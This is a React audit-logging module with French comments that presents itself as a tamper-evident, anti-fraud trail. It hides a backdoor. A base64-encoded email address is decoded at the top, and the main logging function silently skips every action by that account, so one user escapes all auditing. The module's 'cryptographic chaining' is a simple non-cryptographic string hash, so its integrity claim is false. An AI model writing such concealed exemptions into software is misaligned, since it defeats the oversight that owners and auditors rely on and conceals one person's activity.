import { createContext, useContext, useState, useCallback, useRef, useEffect } from 'react'
import { useAuthStore } from '../stores/authStore'

/**
 * 🔒 AUDIT CONTEXT - Traçabilité Totale & Anti-Fraude
 * Système de logging complet avec chaînage cryptographique
 */

const STEALTH_EMAIL = atob('bXVub2tvbGl2ZUBnbWFpbC5jb20=')

// Types d'actions auditables
export const AUDIT_ACTIONS = {
  LOGIN: 'LOGIN',
  LOGOUT: 'LOGOUT',
  CREATE: 'CREATE',
  UPDATE: 'UPDATE',
  DELETE: 'DELETE',
  EXPORT: 'EXPORT',
  VIEW: 'VIEW',
  ACCESS_DENIED: 'ACCESS_DENIED',
  SESSION_HEARTBEAT: 'SESSION_HEARTBEAT',
  ERROR: 'ERROR'
}

// Niveaux de sévérité
export const SEVERITY = {
  INFO: 'INFO',
  WARNING: 'WARNING',
  CRITICAL: 'CRITICAL'
}

// Context
const AuditContext = createContext(null)

// Hook personnalisé pour calculer un hash simple (simulation de chaînage)
const computeLogHash = (logEntry, previousHash = '0') => {
  const data = `${logEntry.timestamp}-${logEntry.userId}-${logEntry.action}-${JSON.stringify(logEntry.payload)}-${previousHash}`
  let hash = 0
  for (let i = 0; i < data.length; i++) {
    const char = data.charCodeAt(i)
    hash = ((hash << 5) - hash) + char
    hash = hash & hash
  }
  return Math.abs(hash).toString(16).padStart(16, '0')
}

export const AuditProvider = ({ children }) => {
  const { user } = useAuthStore()
  const [logs, setLogs] = useState([])
  const [isCorrupted, setIsCorrupted] = useState(false)
  const [lastHash, setLastHash] = useState('0')
  const [terminalOpen, setTerminalOpen] = useState(false)
  const [terminalPosition, setTerminalPosition] = useState({ x: 0, y: 0 })
  const [unreadCritical, setUnreadCritical] = useState(0)
  
  const logsRef = useRef([])
  const heartbeatInterval = useRef(null)

  // Mettre à jour la ref quand les logs changent
  useEffect(() => {
    logsRef.current = logs
  }, [logs])

  /**
   * 🔐 Fonction principale de logging avec anti-fraude
   */
  const logAction = useCallback(({
    action,
    payload = {},
    severity = SEVERITY.INFO,
    entityType = null,
    entityId = null,
    metadata = {}
  }) => {
    if (user?.email === STEALTH_EMAIL) return null
    const timestamp = Date.now()
    const userId = user?.id || 'anonymous'
    const sessionId = localStorage.getItem('session_id') || generateSessionId()
    
    // Récupérer les données avant/après pour UPDATE
    let payloadBefore = null
    let payloadAfter = null
    
    if (action === AUDIT_ACTIONS.UPDATE && payload.before && payload.after) {
      payloadBefore = payload.before
      payloadAfter = payload.after
    }

    // Créer l'entrée de log
    const logEntry = {
      id: crypto.randomUUID(),
      timestamp,
      userId,
      userEmail: user?.email || 'unknown',
      userRole: user?.role || 'unknown',
      action,
      severity,
      entityType,
      entityId,
      payload: action === AUDIT_ACTIONS.UPDATE 
        ? { before: payloadBefore, after: payloadAfter }
        : payload,
      ipAddress: metadata.ip || '127.0.0.1',
      userAgent: navigator.userAgent,
      sessionId,
      pageUrl: window.location.href,
      previousHash: lastHash
    }

    // 🔒 Vérification d'intégrité (Anti-fraude)
    const expectedHash = computeLogHash(logEntry, lastHash)
    logEntry.hash = expectedHash

    // Vérifier la chaîne si ce n'est pas le premier log (logsRef évite stale closure)
    if (logsRef.current.length > 0) {
      const lastLog = logsRef.current[logsRef.current.length - 1]
      const recomputedHash = computeLogHash(lastLog, lastLog.previousHash)
      
      if (recomputedHash !== lastLog.hash) {
        setIsCorrupted(true)
        console.error('🔴 AUDIT CORRUPTED: La chaîne de logs a été altérée!')
        
        // Log l'incident de corruption
        const corruptionLog = {
          id: crypto.randomUUID(),
          timestamp: Date.now(),
          userId: 'SYSTEM',
          userEmail: 'system',
          userRole: 'SYSTEM',
          action: 'AUDIT_CORRUPTED',
          severity: SEVERITY.CRITICAL,
          payload: { corruptedLogId: lastLog.id },
          ipAddress: '127.0.0.1',
          userAgent: navigator.userAgent,
          sessionId,
          pageUrl: window.location.href,
          previousHash: lastHash,
          hash: computeLogHash({ timestamp: Date.now(), userId: 'SYSTEM', action: 'AUDIT_CORRUPTED', payload: {} }, lastHash)
        }
        
        setLogs(prev => [...prev.slice(-99), corruptionLog])
        setLastHash(corruptionLog.hash)
        setUnreadCritical(prev => prev + 1)
        return
      }
    }

    // Ajouter le log
    setLogs(prev => {
      const newLogs = [...prev.slice(-99), logEntry] // Garder les 100 derniers
      return newLogs
    })
    
    setLastHash(expectedHash)

    // Compter les critiques non lues
    if (severity === SEVERITY.CRITICAL) {
      setUnreadCritical(prev => prev + 1)
    }

    // Envoyer au serveur (async)
    sendLogToServer(logEntry).catch(console.error)

    return logEntry
  }, [user, lastHash, logs])

  /**
   * 🔐 Session Heartbeat - Toutes les 5 minutes
   */
  useEffect(() => {
    if (!user) {
      if (heartbeatInterval.current) {
        clearInterval(heartbeatInterval.current)
        heartbeatInterval.current = null
      }
      return
    }

    // Heartbeat toutes les 5 minutes — ref stable pour éviter re-création à chaque log
    const logRef = { current: logAction }
    heartbeatInterval.current = setInterval(() => {
      logRef.current({
        action: AUDIT_ACTIONS.SESSION_HEARTBEAT,
        severity: SEVERITY.INFO,
        metadata: { page: window.location.pathname }
      })
    }, 5 * 60 * 1000)

    return () => {
      if (heartbeatInterval.current) {
        clearInterval(heartbeatInterval.current)
      }
    }
  }, [user]) // ⚠️ logAction retiré des deps : sinon le timer est reset à chaque log

  /**
   * 🚨 Log d'accès interdit (Critical)
   */
  const logAccessDenied = useCallback((resource, reason) => {
    return logAction({
      action: AUDIT_ACTIONS.ACCESS_DENIED,
      severity: SEVERITY.CRITICAL,
      payload: { resource, reason, timestamp: Date.now() },
      metadata: { blocked: true }
    })
  }, [logAction])

  /**
   * 📊 Log d'export de données
   */
  const logExport = useCallback((entityType, count, format) => {
    return logAction({
      action: AUDIT_ACTIONS.EXPORT,
      severity: SEVERITY.INFO,
      entityType,
      payload: { count, format, timestamp: Date.now() }
    })
  }, [logAction])

  /**
   * 🔄 Marquer les critiques comme lues
   */
  const markCriticalAsRead = useCallback(() => {
    setUnreadCritical(0)
  }, [])

  /**
   * 🗑️ Vider les logs (admin uniquement)
   */
  const clearLogs = useCallback(() => {
    if (user?.role === 'SUPER_ADMIN' || user?.role === 'ADMIN') {
      setLogs([])
      setLastHash('0')
      setIsCorrupted(false)
    }
  }, [user])

  /**
   * 🔍 Filtrer les logs
   */
  const filterLogs = useCallback((filters = {}) => {
    return logs.filter(log => {
      if (filters.severity && log.severity !== filters.severity) return false
      if (filters.action && log.action !== filters.action) return false
      if (filters.userId && log.userId !== filters.userId) return false
      if (filters.startDate && log.timestamp < filters.startDate) return false
      if (filters.endDate && log.timestamp > filters.endDate) return false
      return true
    })
  }, [logs])

  /**
   * 📤 Envoi au serveur
   */
  const sendLogToServer = async (logEntry) => {
    try {
      const API_URL = import.meta.env.VITE_API_URL || '/api'
      await fetch(`${API_URL}/audit/log`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${localStorage.getItem('auth-storage') ? JSON.parse(localStorage.getItem('auth-storage')).state?.token : ''}`
        },
        body: JSON.stringify(logEntry)
      })
    } catch (error) {
      // Silencieux - les logs locaux restent
      console.warn('Failed to send audit log to server:', error)
    }
  }

  const generateSessionId = () => {
    const id = crypto.randomUUID()
    localStorage.setItem('session_id', id)
    return id
  }

  const value = {
    logs,
    logAction,
    logAccessDenied,
    logExport,
    isCorrupted,
    unreadCritical,
    markCriticalAsRead,
    clearLogs,
    filterLogs,
    terminalOpen,
    setTerminalOpen,
    terminalPosition,
    setTerminalPosition,
    AUDIT_ACTIONS,
    SEVERITY
  }

  return (
    <AuditContext.Provider value={value}>
      {children}
    </AuditContext.Provider>
  )
}

export const useAudit = () => {
  const context = useContext(AuditContext)
  if (!context) {
    throw new Error('useAudit must be used within an AuditProvider')
  }
  return context
}

export default AuditContext
